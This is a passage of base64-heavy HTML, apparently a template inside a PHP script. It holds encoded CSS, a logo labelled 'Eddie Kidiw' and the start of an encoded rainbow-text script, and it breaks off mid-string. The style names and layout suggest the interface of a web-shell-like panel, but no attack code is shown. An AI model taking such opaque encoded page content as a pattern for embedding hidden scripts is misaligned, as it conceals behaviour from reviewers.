6MXB4OyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVRDQVlBQUFCUkMyY1pBQUFBYWtsRVFWUjQyZ0ZmQUtEL0FFSkNRdjhBUUVCQThRQStQajdrQURzN085WUFPVGs1eVFBMU5UVzdBREl5TXE0QUxpNHVvUUFyS3l1VEFDY25KNFlBSXlNamVBQWZIeDlyQUJ3Y0hGMEFHQmdZVUFBVkZSVkRBQkVSRVRVQUR3OFBLQUFNREF3YUFBb0tDZzFwM0JLQ3lwblNHUUFBQUFCSlJVNUVya0pnZ2c9PSk7IGNvbG9yOiM3ODc4Nzg7IHRleHQtc2hhZG93OiMwMDAgMXB4IDFweCAycHg7ICBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgdG9wOyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzMzM30NCi5mb290ZXIgYTpsaW5re2NvbG9yOiNhOWE5YTk7IHRleHQtZGVjb3JhdGlvbjpub25lOyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzNmM2YzZn0NCi5mb290ZXIgYTpob3Zlcntjb2xvcjojZDJkMmQyOyB0ZXh0LWRlY29yYXRpb246bm9uZTsgYm9yZGVyLWJvdHRvbToxcHggZG90dGVkICM2OTY5Njl9DQoubGVmdHtmbG9hdDpsZWZ0fQ0KLmxpc3QxLCAuYntiYWNrZ3JvdW5kLWNvbG9yOiMxMDEwMTA7IG1hcmdpbi10b3A6MXB4OyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzMyMzIzMn0NCi5saXN0MntiYWNrZ3JvdW5kLWNvbG9yOiMyMTIxMjE7IG1hcmdpbi10b3A6MXB4OyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzMyMzIzMn0NCi5je2JhY2tncm91bmQtY29sb3I6IzA0MDQwNDsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjMzIzMjMyfQ0KLnNob3V0e2JhY2tncm91bmQtY29sb3I6IzA0MDQwNDsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjMzIzMjMyfQ0KLm1haW50eHR7cGFkZGluZy1yaWdodDoxcHg7IHBhZGRpbmctbGVmdDoxcHg7IGJvcmRlcjoxcHggc29saWQgIzNiM2IzYn0NCi5tZW51LCAubmV3c3tiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVFDQVlBQUFEWG54VzNBQUFBVzBsRVFWUjQyZ0ZRQUsvL0FBUUVCQUFBQndjSER3QUtDZ29mQUEwTkRTOEFFQkFRUHdBVUZCUlBBQmdZR0Y4QUhCd2Nid0FnSUNCL0FDUWtKSThBSnljbm53QXJLeXV2QUM0dUxyOEFNakl5endBMU5UWGZBRGMzTis5UHFRMEdrNDNON3dBQUFBQkpSVTVFcmtKZ2dnPT0pOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMzNTM1MzV9DQoucGhwY29kZXtjb2xvcjojMDA3OThmOyBiYWNrZ3JvdW5kLWNvbG9yOiMwMDExMTQ7IGJvcmRlcjoxcHggZG90dGVkICMwMDI3MmU7IG1hcmdpbi10b3A6NHB4OyBwYWRkaW5nOjAgMnB4fQ0KLnF1b3Rle2JvcmRlci1sZWZ0OjRweCBzb2xpZCAjNWM1YzVjOyBjb2xvcjojNTg2Nzc2OyB0ZXh0LXNoYWRvdzojMDAwIDFweCAxcHggMnB4OyBmb250LXNpemU6eC1zbWFsbDsgcGFkZGluZzoycHggMCAycHggNHB4OyBtYXJnaW4tbGVmdDoycHh9DQoucmVkLCAucmVkIGE6bGluaywgLnJlZCBhOnZpc2l0ZWR7Y29sb3I6I2QyMDAwMH0NCi5yZXBseXtib3JkZXItbGVmdDo0cHggc29saWQgI2NhMDAwMDsgY29sb3I6I2RiMDAwMDsgcGFkZGluZzoycHggMCAycHggNHB4fQ0KLnJtZW51LCAuYWxhcm17Y29sb3I6I2JkMDAwMDsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFSQ0FZQUFBQWN3OFlTQUFBQVlFbEVRVlI0MmdGVkFLci9BRTBCQWY4QVNnRUI4QUJHQVFIaEFFSUJBZElBUGdFQnd3QTVBUUcwQURRQkFhVUFMd0VCbGdBcUFRR0hBQ1VCQVhnQUlBQUFhUUFiQUFCYUFCWUFBRXNBRVFBQVBBQU5BQUF0QUFrQUFCNEFCUUFBRDR1TUM5R2tXSDhhQUFBQUFFbEZUa1N1UW1DQyk7IGJhY2tncm91bmQtcmVwZWF0OnJlcGVhdC14OyBiYWNrZ3JvdW5kLXBvc2l0aW9uOjUwJSB0b3A7IG1hcmdpbi10b3A6MXB4OyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzU5MDAwMH0NCi5zdGF0dXN7Y29sb3I6IzNmYTQwMDsgdGV4dC1zaGFkb3c6IzAwMCAzcHggM3B4IDRweDsgZm9udC13ZWlnaHQ6Ym9sZDsgZm9udC1zaXplOngtc21hbGw7IHBhZGRpbmctbGVmdDowfQ0KLnN1Yntib3JkZXItdG9wOjFweCBkb3R0ZWQgIzRiNGI0YjsgZm9udC1zaXplOngtc21hbGw7IG1hcmdpbi10b3A6NHB4fQ0KLnN1YiBhOmxpbmssIC5zdWIgYTp2aXNpdGVke3RleHQtZGVjb3JhdGlvbjpub25lfQ0KLnRtbiwgLmZtZW51e21hcmdpbjoxcHg7IHBhZGRpbmc6MXB4OyBjb2xvcjojYjk0MjAxOyB0ZXh0LXNoYWRvdzojMDAwIDFweCAxcHggMnB4OyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVNDQVlBQUFDYVY3UzhBQUFBWlVsRVFWUjQyZ0ZhQUtYL0FBSUJBQUFBQlFNQURnQUlCQUFjQUFzR0FDb0FEd2dBT0FBVENnQkdBQmNOQUZVQUhBOEFZd0FnRVFCeEFDVVVBSDhBS1JZQWpRQXVHUUNiQURJYkFLb0FOaDBBdUFBNkh3REdBRDBoQU5RQVFDTUE0Z0JFSkFEd1d1Z01MbWVFaC84QUFBQUFTVVZPUks1Q1lJST0pOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICM1YzI5MDF9DQoudG1uIGE6bGluaywgLnRtbiBhOnZpc2l0ZWQsIC5mbWVudSBhOmxpbmssIC5mbWVudSBhOnZpc2l0ZWR7Y29sb3I6I2I5NDIwMTsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGJvcmRlci1ib3R0b206MXB4IGRvdHRlZCAjNjAyMjAwfQ0KLnRtbiBhOmhvdmVyLCAuZm1lbnUgYTpob3Zlcntjb2xvcjojZmY1YTAwOyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzkzMzQwMH0=" /></head><body%s><div class="menu"><div class="gmenu"><center><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAH0AAAAdCAYAAACHdGN/AAAABGdBTUEAALGPC/xhBQAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB94DExUnCsERb74AAB76SURBVGje5Zp3eJRV9vjPfcvMZFqmZDJJJhVSqCGFkkAISlcExbUg67pfv+h+1bWtCgTSZoaEZAFhddUVdVdZxcJ+Fwtto0AILRB6iQQSkkmZTNr0/rb7+2MlCxg17OLv+T3P7/1rnmfOe875nPPee8899wL8//w89RTxc6hNKi9PSKmqujvRbI79f5EFXfsxfe3aZEGnMyuSkub6WDYU8vk8rMt1KQIhn0KrncKSpITHAsEJGAIOx0WeZVtFAAJFEJQsJuZep8/ncDQ15XVUVISHa3zBn//89x6e9/vD4Uua0aOfl+h0KoKiUMjpDDmuXDkW9njqJDLZPHdb26KutWs9/04spldVJXKpqTXuUKiVFwQfHRGhp+VyvTwqKjbocLj7T59eJtJoHkQIiRmH4++WVat2/JTOtDVrpIgkCwSRaDQtkUxGIlEUUBRJR0ToFDpdksdmu+xzOL6QajQLaKk0OuzxtIXc7oMoFHJjADnm+W5SLt/a8sIL/K2wJJvNiSljx9b0BgL/EQsCAMg0GlMDUun9PE2z0Wlp/2W3WP7O+nxNAMBHAPhEgjAAPG8P8vxAe29vQK/VquUjR74uCIIPXK4jnM93EsXHL1fpdPN6Tp+e3WU0fnu9kcUbNz4W0mr/O6DVprkZxh32eJrB6fwHEwp1kypVIR0dPUkSHZ1ISaUSmUaj6qqt/dTf3l4JHOeSpadvlkql43tOncrsqa4ODic4o0pKVDKRiJOIRDIyI+Mfdp/vKshk+sSCggKCJAEQAo7jcF9jYysXDHp4hgkhkqTlUVEjOKfT13PkyESr3W6Ht98WhtJfUlNzvkenG/l1Tc39IAg+dH1ASTKGDwaPdZpM1pGbN/8R+3xN8jFjnnOdPVvasWrV3+KNxgkilerXBMfRbCCwsr2sLPBjLIbVq1VAURxF07LJWVn/oIPBq1dFIr1m6tR/mwUBAMQWFUVIYmMZ+YgR5yfm54/pwxg4jgMKY1BSFEQiBDzLAsnzOEYkQr0EAf0IQRAhQBiDVBDgzDfffEWQZGSgtbWqc/XqmqEARlRXL5ZnZVVwLBuIjI1NVcfFRVIUhXhBwNKICKQlCLAIAoRdLq7nxImDMRMmFHoHBpx9R4+aJRrNAtbtPtv24ourfixIM6uqJhDjxu2w2u21urS0Bd6urpOZ+fmzk6RSIpHjeAVB4H2hEHSKxbSAMQBCAAQBiCQBAKDr2LEzvtbWr+Ra7S887e1rOoqKtl2v/+n33jMa4uJmn7BYtnILFvyRl0hIwBgQAGCWBYFlwdHa2hf2+/uTc3LGLlQq8XavF9u7ugYEhuE9FsuR4JUrjzI0LURqtR+FHI7lnWVlHUOObJNpQtakSTsu9/XVatLSFlDd3ScfmTFjtoMkif5AgMcAuEcQwC2R3MhCfcdSPzTL4EcabzZL1ZMnn5k/dWr6oY4Or7Op6fQ8pVISlZU1udbnE7obGg6QXV3vjtRopuGCgqf0Oh3tIwiwdHY6pdHRStbv56x7935EEIT86rJlS653PsFoTKNjYp5Tjhq1aGxmZpI9EOBQX597SXKyxt3V1d9HEHRWcrL6W39A2N1t9SoMhkiMMZAkCX6vl/W0t3fb6+oKtXl59eHe3iZPU9MS29q1/UMFau7f/tZo6ep6I3b27HWKmBjZeIpCOT09jopvvqlyBgIdgiA4AGM7sKyApNJM+YgRz3J+v2Xn0qUPfcYwcIhhwFpff8Z98eLr2lGj1oT7+69eXrbsjuttPPvJJ5sXzZ37uEcioV5tbXUDTYtkKpX06hdfvIYxFgS//1ueYfqfWbDgA2rA3nLf9IKJz7rdACQJIAjgam119tTVPYd5PhA3ceIH1qNHC6xlZRduZnlt//7Gs83Nb4yZNWtds0YjcwkCgrY2x9mjR6uCwWAHCIID38TC+P2WgkWLHnITBPgFAaz19Wc8Fy++rrmOhbpmQEAoW2YwJAQxBkdbW5OnsXHlNkFwyG22TUGr9W0sCHYkCOeODQx8Rbe3/1Galr5+4fSCu+4ZOVK9heOAkEhIZWbm3Qq5PJrZuPHFzpde+sM13Z1GY3P2/v0PSZOS1IUSCXzudkPT+fM1RTt2VmOB91JSaa4QDJ4SeN6LBQGip0xp8F29+oelY8cuPZiRMSlq3LgkRXx8S8euXaaYadNKyIiI/TaA8UMlvdvhOCtSqaYoeT78a7lcXt3Y6NqyY0cey3E2WiIZ111aeizKZKIphlH1GI3nDCZTHSaIEfd9+WXU4/Pnz4ylKOAmT872d3TkDFy48Lh2zJi/3Gxj0uTJv+qkKKpAJEL+o0ffdwQCNn1+fjHrdB7oWrXqCwCAmLKy6Ld27LgbwuGuPx4/liFLSnquYN68he00jSLT09WKuPiPmt7dnM4SBKufNOkAmM0J1pum+o7e3rMqtXpKIs+HFykU8hfPn3ed3bkzj7uORWcy0eRNLA379kU9OX/+zF0IgX4IFhIAwGA23wcSSbQkOXm+RyqV9Bw+vJmSy8dKtNonrj7++N3effuuePfv7/LW1rKBw4c5b12dw7F9+6cdUVG1Zylq7gPx8crLAEBLpbKrH398NxKJomXTp0t8+/dbrgHon3xyhSIyUmwHII9t2TKfcTi2IopK6SkrO+3Zu/eS98ABl3zmTAWBsffq009vdNXUNLRkZHQGu7q6k9PTpzJKJUWoVDl9dXWV+smTl/AJCce9+/ZdvT5I6Waz2uN2H9RNmbL+vrS0qA/8ftT+xRfLBJbtpsTiCZjjfL66OlvgwAFBOWlSmre+vtd74IDbW1troceOPWOPi3tsWmQkfWZgwK9KS5vq/vbbL2il8k5yzJjP/HV1/mt2ggkJXyhzcn47TiSC9y5ebBOCwY6osWMX9h0/vixw5AgHAKC44w6RmKJe6igv/9izb1+rffv2T13x8cGHc3Pn2AAgIPCCz2olAy5XS8jt7uAcjt2+gwcHi+DRZrOa8vkOzp42bf2Y5OQokiDQuk8+WYaHwSIeO/aMNCHhsdmRkXTDECwEAIC1rOwLUq0uFDDGgWCQwyw7EOru3qgwGKb82PrZXVJypO/Ikae3O508DwAgEhGysWOru373u02KmJjXr5eV6HSqp2NjxW0sKyCxOE0IhfwQDkv0JSXaazI9RmOf7brq31ZS8jXDMCUX6ur+oRIEkCcmqkQJCXd1nT27k+e4gZv9oSkqg1Kp7g+xrD9RLEa2kycbhVCoFUSiMcBxBpvJdGrQ940bz13/rpQkVdZDhzbXB4Norlwu+m7m2uhsbn6GViieuV62ZvnyRns4LABCED1jxoOS1NRHBYQQIRZHDfpuMjnbioufvsFBh+PzPo6DZ/z+ACcIEDVt2hOM03mQFIlSbRUVN+xOpDSdoVSr73cHAn4xRaFle/cOm0VBUar2w4c3A8YoUiz+Hgv1r4jRMdK4uEhMECDJyHiS6O3N89rt7T9VKWOW7eIBUCTG4MIYwk7npajVq7U8w9ywdQt5PCGFIFBIIiGjpk9f31dbG7StXPnBT+nvevFFPsZkejp6+vTWfpmMlKalZbrOnNkrTUl+W19efl+vyWS9JisaMWJTbHr6uHiaZit7enj32bNP8izbKiHJJV1G44s/ZudqSckhADgUERMzC+XmTujct+/jUFtbKaFULhZYVnyzvCgU4ut8PuyyWCzukycXRMbGdmCed/+YjRnx8Q9NpmkgAgHUc/z48WBz87vaceNes585s+Rm2fuysjZNGDVqXJjjWF8oxLecPj1slqbi4kNNAIc0cXGzojMzJxypqfk41NZWSn7HMrihF3jeYzt58lRyRASKSEoaKUlKutPf0/PeT+6PRKJ0TFEECQCY5yHc0bEKkaT06jPPTLomoistTXC2tNQf4DjEcRx2XLq0h3O7dw13f9pTXt5xoLGxM5MkQaTVyiOSkvL8XdaNIJHMumF0jB6dy/X2tpSmpqp66ut3s17vWYKikkKhUMlw7IypqKAdp08/0PD55xs7Hn/8l31mcyuJ8eiwx1N1syzh94ccNE2SUqkSAbBMIBAmVKolP6ZfHRk5JpGiIFGni8AA0LNixfv2Cxee7Sku/t5u587c3NxL7e0t6fHxql/v3HnLLGkVFfSVEyceOHodC8J4NOPxVA0mnVarJ2gmT86dJxYDFRkpxSRJAElqf0q5QJIqv9MZdHMcsAwDWCzOwwDimE2byEEhsTg17HQ2XmQYwAihsNW6ldTpHo9eu3bxcBPvbWn5LEoQgJTJKFliYgzGOEiKxfNu+Dja25tykpOTnwwGkS4//x5ar3+ir7z8xMCaNb7h2Pi2pITVUlSa9YUXXh6cyTiOtldV3TD1znjlFcLtcPTzACBPTo4GkSgZRGKqZ/nyd35wlFdUJASCQVuI5zEGAG1OTp6uomJuz8qVW4eSr790qWlkQkIyTVFInJd3yyzNJSUsSRBp7c8/P8gCHEcPVFV5Bqd3HoDHFIVa3W6GkMtFvsbGjyLS05fp1q/v512uTx2VlfapJpNYJpONoRGKsTPMQLtK9RsqLi4HUxTpDYWg//DhQwLHeXmedw787neD3ab+kpLa6NdemxEMhwWeogj5xIlveE+delkcGfkcAHw+HAjbM88UfTJq1CPKrKxEv93uEkKhtlAgUA4AMK+62nCRohYATSvyYmMVJxgGeg4d+hvr8dRElZWNGDCbW4f7cSlJ8lRKaWmuj+fzMEH088Hg76//X19WZkg2GJbEREVFkQgBQdMIyWSzQCEXRZWVqQfMZuf18jEm0/gZd9yxr6e//3x3c/NT/d3dy/RJSSqfzebDJKmNWbduS8+KFb++Jh9VWmq4y2BYIJVIFMl6vUIQBLD9myx2nj8VvXp1LgbIwwTRHw4Efg8AQAEAaEpKUsO9vXVMKDT+nEJBCzwPfCjU7m9t/at6zpz1EqXyjcRHHuE5rzfY73Y7Ga+3M9zbux9kMr0kPn5ERESEyFZXV2tdsmQmPPUUEaVSPQAANzQ1SK12qi8Y5H0eT8Bz/PiTAsNcAo3m5VtpQ4Z8vr4ogESJIU6L1Op5BMtqAKCopqjICgDvRL/5ZvrAhAnPCQRBMl1dWxBNZwgsa7kVG0dKSvoAoA8ATg31f6/ZbNVt3z7DzbJsFEEATVGAVKpMpFRSypkzr2jvukvGBQIhPhQKhF2uc2KNZqRdKuV9GRmTB0aMOD46MVH1rcXi7t+1KweTJCUgxF2vf2DNGuuHAO9ItmxJTx0x4rk6jvu3Wawm05AsFACAo6KixfDll3N5nsc2lgUeIdA/+uibiRQFYUGAK+fONQUvXNgiC4UuqnNzKyOnTZtKOBwT+KgoqR4hdPrEiavh7u45AABqnW4sx7Lnv7cMCAJLRkTQjNVqZ73eA55164LUhg2X4KmniB9qd17/qMrLYxVjxuTEkiRc9HgZgWH6SJIce8OHFRmZd56mRTzLAh8IXEAyWQECyAWAC7fzbANjjMQGg5ZhGD6epsnu3NwFvfv2beO93ovA8z6MMYgSE+/VzplzN03TwPt8YblCIQ4xDH6krY2zbtu2GEVEZJMY5/DhcN1QNvRabR4jlYr2ezz/YkHotrD8qzlDEAhTFGFrbrYFjhz5o3rhQtNorVZU09IyEJGQkCYfNarqebUaJtE0bPv666+TDIYxBEIS84EDDcHz5xcILCvSlJf/Dw/wmbu62nazIZ7jXMKVKy1IrY4FsVihf+ed2nBfn3k4CQcAIOTyuwQA6GZZ8DQ2Huc9ni8FiaT3eplAc/PLV5XKTVxOTj4RFfWIEAhcIcTirNt9oHXaYvkTf+7c2KyJE1OKxWJYkpKikRgMD+Fw+CEQ/omjBuCrVCpwAMBXNC0+GwwC43Dw9l27ljtLS2tVRuN4ABjlNJu/HsrGhUuXXu6jqE2G7Oz8K9dYRKLbwvKv4ziCoAmKIpiBgX7CYJgbbG21/+Xttxc1Tp2qs+/eLbbX1u44bLWGKt1uePfy5Z1l58+fKP7kk3LGap0ONC0iVapfCwhdcZtMtqEMycaMWfTG5MkjKb1eqpgx40LI4djsKinZPVxHHcuX/8VrsbQ7eR74YNDtrqx0EhLJ3ME2stE4AcTiOEV6erZAkkAaDPcKweBZEItTb3fSa19+eXdHQ0OxheOgXxCA5zjggkHcv2fPloFvvtnmb2lxWbZtezHMMFjN83DC4cCdX331Ue/WrRMdL7/8BwAAl9F4wdHTUzWU/hSTaYJILI67OzMz26hW33YW4ro2LEqlaZBnZWUSFKX11dWlCAxzDgDA8dJLfLilZcWuHTtKznm9mB49+jeUwZBFxMXdHXa7CTI29i2kVE5n/f6jP2SI1OtlYppGPMeBv6lpKwiCS75qlXa4jspXrlTRMTFxIoIASWpqoWzFioiIkSP/a1A/gDsiLa1YIggshzGmFIoRnooKCyAk+TmOr8fm5KyhMYYzDAOuhoarvVu23BW2WJ4daGh4xHHgQLTt5ZffeGDDhvx7160r6K2tbWDa21/FJEkpy8sXKleu/Oeu4wdmOQVBuMeNHl3MhcMs/zOwUAAAioqK2QLP4y6GAdbv5wJnzkwDsViFwmHXNUGP2dwEAE1EVFTh/QsWLPo6EOAEtzs2/O23eXfm599Td/myFXV10UNWxNXVS9lAgC0LBETBnh4P73YfwSx7FDguGQDsw/o6NZqHkFhMKQDASVEiQq1exIRC3mv/txuNltTGxqzikSPJhfX17eFLl0YCAPA8H7jVoBgqK2dpxOKstISExw92dFweWL78F9+rMUKhPioYTHlr9+6vQn19D3AsS5AIyeHttwU/gAAA4DUaj0vLy2nc3v40ZhgrKZEs5zluD6nXH/wx++dLSy1vu1xZUqmUPHjhQnvgP2BRmM2zSIrMkmmjHve73ZddK1b8ggAA8JaU7GU9Hmv7iRPnGbfbhwliJMhkvwGF4qUbkrdxI8laLBVfnT7d9YRGQ5FxcRJxfv7mw199tYBxu+vp1NQhp2tPUdHH/ubmppOBADB9fVZvcfHfCaVywLd+/anhOK4zGtOJ6Oh7hECA7XK5sHvPnlk4EKhnrNYbZpaQ3899FgyCeMSIRN7vnxuxfLkKKEox3AA98f77m16vr+8ipNKcTp/v9e0PPzwOY3xAbjY/MrhMrV6d/Oh775FRev1IJU0TfTbbHs7rLUQAKcDz82/WGTCZWG9Z2RlfdXW/22hc4ausrHW/9NJPXp7wBgIcAoA/6HSJvN8/V3qLLPGvvbZp4o4dXUgqzQmHmdet//M/43iMD8jM5kcGp3dMURGatLQMUq+PpLOzt2CetxJK5YwbkvfSS7zPaDwRaGh4/J3W1pAAABG5uaPR4sU7OItlnSASgay6+omhnGAdjithq9UhSkvLkJaWTuCcznHDuhBhMqmJtLQaPhTqCrtcPtf+/e8KLGsFgnjQvXz5DR0wx+7duUfOnWvnxWIkmTXrQyoj402WYXYMx86Cdeti8zIzl560WOpGzpljli1dyijeeutNe2vrm6RG88JgnASB7+/rU1p6eq4ijhMEn+8SJogISqt9n0Nox+1aPkx//Wuu8cSJ9gSpFElmzfqQvAUWbXl5rLGgYOmUQKBON3u2WfPLXzKKt95609vW9ial0bxAAADIXn2VxCKRAvn9fp4ggFCrEzmXa5tAkuRQSv2lpXude/Y8owkGMU+SgGJjJRGLFx8Kt7T8N6HRPBGxatX3etVUSkrhe6NHqyAykiQzMqpBIhkzHICm8nKn99KlBdKkpPm8VKrkbLZ3AmvWdPh6ezd9b1QZjY1XBgacUQQBdEaGNqKg4GEhEDit+NOfDsuqqjb+6JQeE1Px4Zkz21zR0TnVKSkinqYxUigmRmi1sUBRkYM2qqs7a1avdnKCwANBYOm9936DpNJs1u/fHKys9N2upB8tKmq02u3OuyWSW2aZl5xcUd/YuC3eYMjZmpYm4m5iIQAAeI9nKkgkUs5g0PChEA7s2zcyXF3tow2GXMnq1UMWW4GiovdbDx06MIrjgCcIIBMTFeSoUa+yPT2vglp9QxdLYjTmkYmJOh0A8DQN1PjxhVgkMkhWrFD+kOPz166Vz/zoo39MPnmSo1NTK+IAArzHExZYtlNSWjrqh4qgUHv7/+bRNPAkCSzPB0WFhX9nrl6dheVyqaisbMiaY6bRqEI0Tdr7+raHo6MNlwYGQsz+/duY5ubng5WVVs7pvHxNNqKs7LH5VVUj0vT6JJlIRPBut4d3uXbRMTFrbnu12NHxvwFBgD2Rkd9jEf8Ai2bFCpVCIiH7+/u3jzAYDDa7PeS9joV1Oi8TAAAhk+kQFomokCDgsM3WH6qocIqNxmzGbu/DCP3gRUe2pWXtifr6S3KOA56iQDRjxhwskcQgtXrijaW3vDDU0tK1nGUJLhTiidhYKcjlI7BcXggAoC4tjU4oLtYNJmHjxgcHxo+/eMXvb3UdOVJyT2JihjQ2NjV49OhjQFEZSCp9U1xerv+BA6D4r+x2rOR54ILBINbrI8nc3J2g12cROt3vxWVliddE796wQf+rP//ZuGjevHO6lJQ75xQWbv7tyJGKpvZ2m+PEiaUYICwuKhKzbveywV0Ow3w2ZvToPyUlJETfL5ejQH39cwJCjWwg0He7c26Qy+ODoRBu+eeW8AYWdBOLuLxcr3ntNePv7r333OjU1Dun5edvTo+LU3x59aot8B2LpKhIzLndywavS8nr6vrHjBunbfJ6hfCXX74KDOPEPt8+xmQ68aOHbCZTvmjevBoqLU0BABDeu/cQIBTLNzU9z5SV7Rl06u23/0JPmfIgQdM8ERcXybW1DZBabRTX3NyDLJb9Grk8LlIslqkQYhwSid5rt19OTEub+Hx6ehRFUeTSTz/9MPTkk4+JysrGA8vGI5quC5vN36tm6bIymtDpKqV5eb/lY2IikEQCCCHEdXZ6sN/PkgqFhj137rQyGOyYk5KSOeBwnCf8/rbMwsLfzE9IkHvt9tAvNm/OIJRKK/Z6o8K9vf03zyqfdHUxJ8RiclooFPxlXV2d0Na2BQTBxZSXf307kz6+spJmNZpKeX7+b9u02ghuCBbu3LnTvN/fQURFZeqCwfP5PN92/513/iY9Lk7+ZVdXaO0HH3yPhaRfeWUKeeedAbqw0JQll6NWhAjB59MKfn8IezyfC4cO/eg6hQoKeL6j4zSZmvogFokQERubxNTWvohEoin83r3fSMvLaZg5czEOBJrItLQHhZaWCzglJR5ptTKBZTm+v99GJCdnUomJyWxsbCyOiFDqJBJq9sSJE1YmJys8LIsfa23F7LFjD5OFhRrg+U7W6WziX32VGfLUr65OIMaPP8u0tr6OGWZGRmJi/ABJAoqMFHMdHZ1sS8sx4fLlZZJwuHl0evq9Y8eNy8nNySmYrtGIxIIAC7Zv/1Tw+Vqxx2PDCAhh46bv3cBtzc4uON/f75ZGRUWfjowcJfT0dDMrV751u0d63/79Ap+ZedbW3Pw6Fw7PoOPi4nmaBuI6Fv7y5WVCMNhMpqbeOyM7O2d0dnZBnlotagqH4ZUdOz7F11gAEcKmjcHBi5HU6tVyes6cPtDpKMzzAt/Q8AWEQkhwOC7x5eXG4ThIv/vuZ6I77ngIcxywdXU7hYGBGr6k5I3BQm79+iIyP/8VUquVRWo0kjDGOERRCBCCVIKAbJqGTowBBAF+KxLBAMPglxoabGGLZT+0tpoA4z4QiThuiNE9pD8bNpDY680DpXJa4qJFlT0qFYU4DnAwCILN5ntHq+XSExIiW/v6vKMMBiVgDNO+/trCNjQsAZ7vQiLRetZoXDpkdVxamoAnTT7Fq1UK/6lTf0AkOV1ob5/Db9gQhJ/hkWzYQPJebx5SKqep77mnMqDRUDzHAQoGgbfZfMBxXHJSUmQZxl5dbKzyQ68XPj12zCL8AAsFACBgDExtbRYgJEMpKR/g9nYj0HQ8cFz0cB3jOzoeDe/c2cJdvlxKqNVSRFFTB41s2EAS2dkmLJMRbHt7T9+ZM83Q23uQzM5+FlQqWUCnk5wmSWhhWRB8Pu5wR8cAX1//AG80HgEAII3GO3E4HEaBQAoAHByOP+wrr/AAcIQsLe3sqKmJJaZNfVbo6LyMLZYvQa2eV9bQsDWk1y9UjxtX0L1jx3nfmTMPY4y9gDEBHMcgQTj+gx0tjaa7f8/uGBQdPZk3mY6R5eW5P1fCAQBC37FQpaWdzm++iRVPm/ZsuKPjMnzHAj09W7s6Oxceycsr+MuuXeeZn2AZXNOJ1avVwtq1TgAAorLyfcwwl7DJtO5WnEOrVy9EPP81pqhYCIcL8YYNfwUAIFauVEJCwufYal0IERGzIBhsArE4FXy+I3jDBg+qqFgMGFPA813A8z5ASIXN5kPEypViAAAskcxBBPErobz84X8naKioSI2io18AkSgf9/VVIYXikLB8OQ8AgIqLxyC1+lnscr0OABJg2TsAoB7EYgs2m3t/slNoMtXgUOgXuKrKB/8XHnrVKjXW6V4QbjtLUdFj/5Fnzz13xxA61VBWVgxlZblgNv8SNm48B8XFE340WaWltKis7DO6rKwYiopSf7ZIrlo1eLULSkvpW3r3qaeIW37n53yGwfJ/ABh0Sb+SOmzrAAAAAElFTkSuQmCC" alt="Eddie Kidiw"/></center></div>
<div class="rmenu"><center><b><p><script type="text/javascript" src="data:text/javascript;base64,ZnVuY3Rpb24gdG9TcGFucyhzcGFuKSB7DQogIHZhciBzdHI9c3Bhbi5maXJzdENoaWxkLmRhdGE7DQogIHZhciBhPXN0ci5sZW5ndGg7DQogIHNwYW4ucmVtb3ZlQ2hpbGQoc3Bhbi5maXJzdENoaWxkKTsNCiAgZm9yKHZhciBpPTA7IGk8YTsgaSsrKSB7DQogICAgdmFyIHRoZVNwYW49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiU1BBTiIpOw0KICAgIHRoZVNwYW4uYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoc3RyLmNoYXJBdChpKSkpOw0KICAgIHNwYW4uYXBwZW5kQ2hpbGQodGhlU3Bhbik7DQogIH0NCn0NCmZ1bmN0aW9uIFJhaW5ib3dTcGFuKHNwYW4sIGh1ZSwgZGVnLCBicnQsIHNwZCwgaHNwZCkgew0KICAgIHRoaXMuZGVnPShkZWc9PW51bGw/MzYwOk1hdGguYWJzKGRlZykpOw0KICAgIHRoaXMuaHVlPShodWU9PW51bGw/MDpNYXRoLmFicyhodWUpJTM2MCk7DQogICAgdGhpcy5oc3BkPShoc3BkPT1udWxsPzM6TWF0aC5hY